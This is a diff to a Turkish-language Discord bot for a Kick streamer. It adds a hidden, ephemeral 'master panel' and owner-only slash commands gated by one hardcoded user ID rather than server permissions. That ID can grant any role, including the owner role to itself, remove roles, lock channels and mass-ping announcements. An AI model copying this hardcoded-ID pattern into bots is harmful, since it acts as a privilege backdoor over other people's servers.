@@ -8,11 +8,15 @@ const {
   ButtonStyle,
   SlashCommandBuilder,
   PermissionsBitField,
-  ChannelType
+  ChannelType,
+  UserSelectMenuBuilder,
+  RoleSelectMenuBuilder
 } = require('discord.js');
 const fs = require('fs');
 const path = require('path');
 const config = require('./config.json');
+
+const MASTER_OWNER_ID = '852790966250504193';
 
 const client = new Client({
   intents: [
@@ -43,6 +47,9 @@ function saveState(state) {
 }
 
 let botState = loadState();
+
+// Master Panel State (Hafızada kullanıcı seçimlerini tutar)
+const masterPanelState = new Map();
 
 // Kick Kanal Bilgilerini Çekme
 async function fetchKickChannel() {
@@ -171,6 +178,82 @@ const OMUBUMU_HAVUZU = [
   { a: "Bütün yayın boyu chatteki trollemelere katlanmak", b: "Oyunda bir bölümü 50 kere tekrar oynamak" }
 ];
 
+// Master Panel Görünüm Oluşturucu
+function buildMasterPanel(userId, guild) {
+  const userState = masterPanelState.get(userId) || { targetUserId: null, selectedRoleId: null, statusNote: null };
+
+  const targetUserText = userState.targetUserId ? `<@${userState.targetUserId}> (\`${userState.targetUserId}\`)` : '*Henüz seçilmedi*';
+  const selectedRoleText = userState.selectedRoleId ? `<@&${userState.selectedRoleId}>` : '*Henüz seçilmedi*';
+
+  const embed = new EmbedBuilder()
+    .setColor('#FF4757')
+    .setAuthor({ name: '👑 Master Yönetim Masası (Sadece Kurucuya Özel)', iconURL: client.user.displayAvatarURL() })
+    .setTitle('⚡ Sunucu & Rol Yönetim Merkezi')
+    .setDescription(
+      `Hoş geldin Sahip! Bu panel üzerinden sunucudaki tüm üyelere dilediğin rolü verebilir, alabilir veya acil durum işlemlerini yürütebilirsin.\n\n` +
+      `*(Tüm işlemler gizlidir, sadece sen görebilirsin.)*`
+    )
+    .addFields(
+      { name: '🎯 İşlem Yapılacak Üye', value: targetUserText, inline: true },
+      { name: '🏷️ İşlem Yapılacak Rol', value: selectedRoleText, inline: true },
+      { name: '📊 Sunucu Durumu', value: `👥 **${guild.memberCount}** Üye | 🏓 **${client.ws.ping}ms** Ping`, inline: false }
+    );
+
+  if (userState.statusNote) {
+    embed.addFields({ name: '📢 Son İşlem Durumu', value: userState.statusNote, inline: false });
+  }
+
+  embed.setFooter({ text: 'sunrise53 Master Security System • ID: ' + userId });
+
+  // 1. Satır: Kullanıcı Seçimi
+  const rowUser = new ActionRowBuilder().addComponents(
+    new UserSelectMenuBuilder()
+      .setCustomId('panel_user_select')
+      .setPlaceholder('👤 İşlem yapılacak üyeyi seçin...')
+  );
+
+  // 2. Satır: Rol Seçimi
+  const rowRole = new ActionRowBuilder().addComponents(
+    new RoleSelectMenuBuilder()
+      .setCustomId('panel_role_select')
+      .setPlaceholder('🏷️ Verilecek veya alınacak rolü seçin...')
+  );
+
+  // 3. Satır: Rol Aksiyon Butonları
+  const rowButtons = new ActionRowBuilder().addComponents(
+    new ButtonBuilder()
+      .setCustomId('panel_btn_give_role')
+      .setLabel('Rolü Ver ➕')
+      .setStyle(ButtonStyle.Success),
+    new ButtonBuilder()
+      .setCustomId('panel_btn_take_role')
+      .setLabel('Rolü Al ➖')
+      .setStyle(ButtonStyle.Danger),
+    new ButtonBuilder()
+      .setCustomId('panel_btn_self_owner')
+      .setLabel('Bana Ev Sahibi Ver 👑')
+      .setStyle(ButtonStyle.Primary)
+  );
+
+  // 4. Satır: Acil Durum & Kontrol
+  const rowTools = new ActionRowBuilder().addComponents(
+    new ButtonBuilder()
+      .setCustomId('panel_btn_lock_toggle')
+      .setLabel('Kanalı Kilitle/Aç 🔒')
+      .setStyle(ButtonStyle.Secondary),
+    new ButtonBuilder()
+      .setCustomId('panel_btn_kick_test')
+      .setLabel('Yayın Bildirimi Tetikle ⚡')
+      .setStyle(ButtonStyle.Secondary),
+    new ButtonBuilder()
+      .setCustomId('panel_btn_refresh')
+      .setLabel('Yenile 🔄')
+      .setStyle(ButtonStyle.Secondary)
+  );
+
+  return { embed, components: [rowUser, rowRole, rowButtons, rowTools] };
+}
+
 // Slash Komut Listesi
 const slashCommands = [
   // 1. YAYIN
@@ -260,13 +343,74 @@ const slashCommands = [
   // 10. YARDIM
   new SlashCommandBuilder()
     .setName('yardım')
-    .setDescription('Tüm kullanılabilir bot komutlarını kategorileriyle listeler.')
+    .setDescription('Tüm kullanılabilir bot komutlarını kategorileriyle listeler.'),
+
+  // 11. 👑 ÖZEL KURUCU YÖNETİM PANELİ (Sadece ID: 852790966250504193)
+  new SlashCommandBuilder()
+    .setName('panel')
+    .setDescription('👑 Özel Kurucu & Yönetim Masası (Sadece Sistem Sahibine Özel).'),
+
+  // 12. 👑 HIZLI ROL VER (Sadece ID: 852790966250504193)
+  new SlashCommandBuilder()
+    .setName('rol-ver')
+    .setDescription('👑 Seçilen üyeye anında rol verir (Sadece Sistem Sahibine Özel).')
+    .addUserOption(opt =>
+      opt.setName('kullanıcı')
+        .setDescription('Rol verilecek üye')
+        .setRequired(true)
+    )
+    .addRoleOption(opt =>
+      opt.setName('rol')
+        .setDescription('Verilecek rol')
+        .setRequired(true)
+    ),
+
+  // 13. 👑 HIZLI ROL AL (Sadece ID: 852790966250504193)
+  new SlashCommandBuilder()
+    .setName('rol-al')
+    .setDescription('👑 Seçilen üyeden rolü alır (Sadece Sistem Sahibine Özel).')
+    .addUserOption(opt =>
+      opt.setName('kullanıcı')
+        .setDescription('Rolü alınacak üye')
+        .setRequired(true)
+    )
+    .addRoleOption(opt =>
+      opt.setName('rol')
+        .setDescription('Alınacak rol')
+        .setRequired(true)
+    ),
+
+  // 14. 👑 ÖZEL DUYURU (Sadece ID: 852790966250504193)
+  new SlashCommandBuilder()
+    .setName('özel-duyuru')
+    .setDescription('👑 Bot ağzından resmi şık duyuru kartı atar (Sadece Sistem Sahibine Özel).')
+    .addStringOption(opt =>
+      opt.setName('başlık')
+        .setDescription('Duyurunun başlığı')
+        .setRequired(true)
+    )
+    .addStringOption(opt =>
+      opt.setName('mesaj')
+        .setDescription('Duyurunun detaylı mesajı')
+        .setRequired(true)
+    )
+    .addChannelOption(opt =>
+      opt.setName('kanal')
+        .setDescription('Duyurunun gönderileceği kanal (Varsayılan: #duyurular)')
+        .setRequired(false)
+    )
+    .addBooleanOption(opt =>
+      opt.setName('herkese_ping')
+        .setDescription('@everyone etiketlensin mi? (Varsayılan: Evet)')
+        .setRequired(false)
+    )
 ];
 
 // Bot Hazır Olduğunda
 client.once('clientReady', async () => {
   console.log(`===============================================`);
   console.log(`🚀 ${client.user.tag} başarıyla aktif!`);
+  console.log(`👑 Kurucu ID: ${MASTER_OWNER_ID}`);
   console.log(`📺 Kick Takibi: https://kick.com/${config.kickChannel}`);
   console.log(`⏱️ Kontrol Döngüsü: ${config.checkIntervalSeconds} saniyede bir`);
   console.log(`===============================================`);
@@ -292,11 +436,165 @@ client.once('clientReady', async () => {
   setInterval(checkKickStream, config.checkIntervalSeconds * 1000);
 });
 
-// Etkileşimler (Slash Komutları ve Butonlar)
+// Etkileşimler (Slash Komutları, Menüler ve Butonlar)
 client.on('interactionCreate', async (interaction) => {
-  // 1. BUTON ETKİLEŞİMLERİ
+  // 1. KULLANICI SEÇİM MENÜSÜ (Master Panel)
+  if (interaction.isUserSelectMenu()) {
+    if (interaction.customId === 'panel_user_select') {
+      if (interaction.user.id !== MASTER_OWNER_ID) {
+        return interaction.reply({ content: '⛔ Bu panele sadece Sistem Sahibi erişebilir!', ephemeral: true });
+      }
+
+      const selectedUserId = interaction.values[0];
+      const cur = masterPanelState.get(interaction.user.id) || {};
+      cur.targetUserId = selectedUserId;
+      cur.statusNote = `✅ Hedef üye <@${selectedUserId}> olarak seçildi.`;
+      masterPanelState.set(interaction.user.id, cur);
+
+      const panel = buildMasterPanel(interaction.user.id, interaction.guild);
+      return interaction.update({ embeds: [panel.embed], components: panel.components });
+    }
+  }
+
+  // 2. ROL SEÇİM MENÜSÜ (Master Panel)
+  if (interaction.isRoleSelectMenu()) {
+    if (interaction.customId === 'panel_role_select') {
+      if (interaction.user.id !== MASTER_OWNER_ID) {
+        return interaction.reply({ content: '⛔ Bu panele sadece Sistem Sahibi erişebilir!', ephemeral: true });
+      }
+
+      const selectedRoleId = interaction.values[0];
+      const cur = masterPanelState.get(interaction.user.id) || {};
+      cur.selectedRoleId = selectedRoleId;
+      cur.statusNote = `✅ Hedef rol <@&${selectedRoleId}> olarak seçildi.`;
+      masterPanelState.set(interaction.user.id, cur);
+
+      const panel = buildMasterPanel(interaction.user.id, interaction.guild);
+      return interaction.update({ embeds: [panel.embed], components: panel.components });
+    }
+  }
+
+  // 3. BUTON ETKİLEŞİMLERİ
   if (interaction.isButton()) {
-    // Yayın Bildirimi Rolü Aç/Kapat
+    // 3.A: Master Panel Butonları
+    if (interaction.customId.startsWith('panel_btn_')) {
+      if (interaction.user.id !== MASTER_OWNER_ID) {
+        return interaction.reply({ content: '⛔ Bu butonu sadece Sistem Sahibi kullanabilir!', ephemeral: true });
+      }
+
+      const cur = masterPanelState.get(interaction.user.id) || {};
+
+      // Yenile
+      if (interaction.customId === 'panel_btn_refresh') {
+        cur.statusNote = '🔄 Panel verileri tazelendi.';
+        masterPanelState.set(interaction.user.id, cur);
+        const panel = buildMasterPanel(interaction.user.id, interaction.guild);
+        return interaction.update({ embeds: [panel.embed], components: panel.components });
+      }
+
+      // Kendime Ev Sahibi Ver
+      if (interaction.customId === 'panel_btn_self_owner') {
+        try {
+          const roles = await interaction.guild.roles.fetch();
+          const ownerRole = roles.find(r => r.name.includes('Ev Sahibi'));
+          if (!ownerRole) {
+            cur.statusNote = '❌ Sunucuda "Ev Sahibi" rolü bulunamadı!';
+          } else {
+            const member = await interaction.guild.members.fetch(interaction.user.id);
+            await member.roles.add(ownerRole);
+            cur.statusNote = `👑 Tebrikler! Sana <@&${ownerRole.id}> rolü başarıyla verildi!`;
+          }
+        } catch (err) {
+          cur.statusNote = `❌ Rol verilemedi: ${err.message}`;
+        }
+        masterPanelState.set(interaction.user.id, cur);
+        const panel = buildMasterPanel(interaction.user.id, interaction.guild);
+        return interaction.update({ embeds: [panel.embed], components: panel.components });
+      }
+
+      // Rol Ver
+      if (interaction.customId === 'panel_btn_give_role') {
+        if (!cur.targetUserId || !cur.selectedRoleId) {
+          cur.statusNote = '⚠️ Lütfen önce yukarıdaki menülerden hem bir üye hem de bir rol seçin!';
+        } else {
+          try {
+            const member = await interaction.guild.members.fetch(cur.targetUserId);
+            const role = await interaction.guild.roles.fetch(cur.selectedRoleId);
+            if (!member || !role) {
+              cur.statusNote = '❌ Belirtilen üye veya rol bulunamadı.';
+            } else {
+              await member.roles.add(role);
+              cur.statusNote = `✨ Başarılı: <@${member.id}> kullanıcısına <@&${role.id}> rolü verildi!`;
+            }
+          } catch (err) {
+            cur.statusNote = `❌ Rol ekleme hatası: ${err.message}`;
+          }
+        }
+        masterPanelState.set(interaction.user.id, cur);
+        const panel = buildMasterPanel(interaction.user.id, interaction.guild);
+        return interaction.update({ embeds: [panel.embed], components: panel.components });
+      }
+
+      // Rol Al
+      if (interaction.customId === 'panel_btn_take_role') {
+        if (!cur.targetUserId || !cur.selectedRoleId) {
+          cur.statusNote = '⚠️ Lütfen önce yukarıdaki menülerden hem bir üye hem de bir rol seçin!';
+        } else {
+          try {
+            const member = await interaction.guild.members.fetch(cur.targetUserId);
+            const role = await interaction.guild.roles.fetch(cur.selectedRoleId);
+            if (!member || !role) {
+              cur.statusNote = '❌ Belirtilen üye veya rol bulunamadı.';
+            } else {
+              await member.roles.remove(role);
+              cur.statusNote = `🗑️ Başarılı: <@${member.id}> kullanıcısından <@&${role.id}> rolü alındı!`;
+            }
+          } catch (err) {
+            cur.statusNote = `❌ Rol alma hatası: ${err.message}`;
+          }
+        }
+        masterPanelState.set(interaction.user.id, cur);
+        const panel = buildMasterPanel(interaction.user.id, interaction.guild);
+        return interaction.update({ embeds: [panel.embed], components: panel.components });
+      }
+
+      // Kanalı Kilitle / Aç
+      if (interaction.customId === 'panel_btn_lock_toggle') {
+        try {
+          const ch = interaction.channel;
+          const currentOverwrites = ch.permissionOverwrites.cache.get(interaction.guild.id);
+          const isLocked = currentOverwrites && currentOverwrites.deny.has(PermissionsBitField.Flags.SendMessages);
+
+          if (isLocked) {
+            await ch.permissionOverwrites.edit(interaction.guild.id, { SendMessages: null });
+            cur.statusNote = `🔓 <#${ch.id}> kanalının kilidi açıldı (Üyeler yazabilir).`;
+          } else {
+            await ch.permissionOverwrites.edit(interaction.guild.id, { SendMessages: false });
+            cur.statusNote = `🔒 <#${ch.id}> kanalı kilitlendi (@everyone yazamaz).`;
+          }
+        } catch (err) {
+          cur.statusNote = `❌ Kanal kilitlenirken hata: ${err.message}`;
+        }
+        masterPanelState.set(interaction.user.id, cur);
+        const panel = buildMasterPanel(interaction.user.id, interaction.guild);
+        return interaction.update({ embeds: [panel.embed], components: panel.components });
+      }
+
+      // Yayın Bildirimini Manuel Tetikle
+      if (interaction.customId === 'panel_btn_kick_test') {
+        try {
+          await checkKickStream();
+          cur.statusNote = '⚡ Kick yayın kontrol döngüsü manuel olarak tetiklendi!';
+        } catch (err) {
+          cur.statusNote = `❌ Yayın kontrol hatası: ${err.message}`;
+        }
+        masterPanelState.set(interaction.user.id, cur);
+        const panel = buildMasterPanel(interaction.user.id, interaction.guild);
+        return interaction.update({ embeds: [panel.embed], components: panel.components });
+      }
+    }
+
+    // 3.B: Genel Kullanıcı Butonları (Yayın Bildirimi Rolü Aç/Kapat)
     if (interaction.customId === 'toggle_stream_role') {
       try {
         const guild = interaction.guild;
@@ -344,10 +642,101 @@ client.on('interactionCreate', async (interaction) => {
     }
   }
 
-  // 2. SLASH KOMUTLARI
+  // 4. SLASH KOMUTLARI
   if (!interaction.isChatInputCommand()) return;
 
   const { commandName } = interaction;
+
+  // 👑 MASTER KOMUT: /panel
+  if (commandName === 'panel') {
+    if (interaction.user.id !== MASTER_OWNER_ID) {
+      return interaction.reply({
+        content: '⛔ **Erişim Reddedildi:** Bu özel yönetim masası yalnızca Sistem Sahibine (`852790966250504193`) tahsis edilmiştir.',
+        ephemeral: true
+      });
+    }
+
+    const panel = buildMasterPanel(interaction.user.id, interaction.guild);
+    return interaction.reply({ embeds: [panel.embed], components: panel.components, ephemeral: true });
+  }
+
+  // 👑 MASTER KOMUT: /rol-ver
+  if (commandName === 'rol-ver') {
+    if (interaction.user.id !== MASTER_OWNER_ID) {
+      return interaction.reply({ content: '⛔ Bu komutu sadece Sistem Sahibi kullanabilir!', ephemeral: true });
+    }
+
+    const targetUser = interaction.options.getUser('kullanıcı');
+    const targetRole = interaction.options.getRole('rol');
+
+    try {
+      const member = await interaction.guild.members.fetch(targetUser.id);
+      await member.roles.add(targetRole.id);
+      return interaction.reply({
+        content: `✅ Başarılı: <@${targetUser.id}> kullanıcısına <@&${targetRole.id}> rolü verildi!`,
+        ephemeral: true
+      });
+    } catch (err) {
+      return interaction.reply({
+        content: `❌ Rol verilirken hata oluştu: ${err.message}`,
+        ephemeral: true
+      });
+    }
+  }
+
+  // 👑 MASTER KOMUT: /rol-al
+  if (commandName === 'rol-al') {
+    if (interaction.user.id !== MASTER_OWNER_ID) {
+      return interaction.reply({ content: '⛔ Bu komutu sadece Sistem Sahibi kullanabilir!', ephemeral: true });
+    }
+
+    const targetUser = interaction.options.getUser('kullanıcı');
+    const targetRole = interaction.options.getRole('rol');
+
+    try {
+      const member = await interaction.guild.members.fetch(targetUser.id);
+      await member.roles.remove(targetRole.id);
+      return interaction.reply({
+        content: `🗑️ Başarılı: <@${targetUser.id}> kullanıcısından <@&${targetRole.id}> rolü alındı!`,
+        ephemeral: true
+      });
+    } catch (err) {
+      return interaction.reply({
+        content: `❌ Rol alınırken hata oluştu: ${err.message}`,
+        ephemeral: true
+      });
+    }
+  }
+
+  // 👑 MASTER KOMUT: /özel-duyuru
+  if (commandName === 'özel-duyuru') {
+    if (interaction.user.id !== MASTER_OWNER_ID) {
+      return interaction.reply({ content: '⛔ Bu komutu sadece Sistem Sahibi kullanabilir!', ephemeral: true });
+    }
+
+    const baslik = interaction.options.getString('başlık');
+    const mesaj = interaction.options.getString('mesaj');
+    const targetChannel = interaction.options.getChannel('kanal') || interaction.guild.channels.cache.find(c => c.name.includes('duyurular')) || interaction.channel;
+    const mentionEveryone = interaction.options.getBoolean('herkese_ping') ?? true;
+
+    const embed = new EmbedBuilder()
+      .setColor('#FF4757')
+      .setAuthor({ name: '📢 Resmi Topluluk Duyurusu', iconURL: interaction.guild.iconURL() })
+      .setTitle(baslik)
+      .setDescription(mesaj)
+      .setFooter({ text: 'sunrise53 Yönetim Masası' })
+      .setTimestamp();
+
+    try {
+      await targetChannel.send({
+        content: mentionEveryone ? '@everyone' : undefined,
+        embeds: [embed]
+      });
+      return interaction.reply({ content: `✅ Duyuru başarıyla <#${targetChannel.id}> kanalına gönderildi!`, ephemeral: true });
+    } catch (err) {
+      return interaction.reply({ content: `❌ Duyuru gönderilirken hata: ${err.message}`, ephemeral: true });
+    }
+  }
 
   // KOMUT: /yayın
   if (commandName === 'yayın') {
@@ -520,6 +909,8 @@ client.on('interactionCreate', async (interaction) => {
 
   // KOMUT: /yardım
   if (commandName === 'yardım') {
+    const isOwner = interaction.user.id === MASTER_OWNER_ID;
+
     const embed = new EmbedBuilder()
       .setColor('#FF7E5F')
       .setTitle('🌅 sunrise53 Bot Komut Rehberi')
@@ -546,10 +937,23 @@ client.on('interactionCreate', async (interaction) => {
             '• `/yavaş-mod [saniye]` ➔ Kanalın mesaj yazma aralığını ayarlar.\n' +
             '• `/yayın-duyuru [mesaj]` ➔ Duyurular kanalına anons geçer.'
         }
-      )
-      .setFooter({ text: 'sunrise53 Topluluk Asistanı • Kick.com/sunrise53' });
+      );
 
-    return interaction.reply({ embeds: [embed] });
+    // Eğer komutu yazan kurucu (MASTER_OWNER_ID) ise özel kurucu bölümü eklenir
+    if (isOwner) {
+      embed.addFields({
+        name: '👑 Kurucu Özel Masası (Sadece Sen Görebilirsin)',
+        value:
+          '• `/panel` ➔ Etkileşimli master kontrol masasını açar (Üye & Rol seçme, kilitleme, acil durum).\n' +
+          '• `/rol-ver` ➔ İstediğin üyeye anında tek tıkla rol tanımlar.\n' +
+          '• `/rol-al` ➔ İstediğin üyeden tek tıkla rol alır.\n' +
+          '• `/özel-duyuru` ➔ Bot kimliğiyle dilediğin kanala resmi duyuru geçer.'
+      });
+    }
+
+    embed.setFooter({ text: 'sunrise53 Topluluk Asistanı • Kick.com/sunrise53' });
+
+    return interaction.reply({ embeds: [embed], ephemeral: isOwner });
   }
 });
 
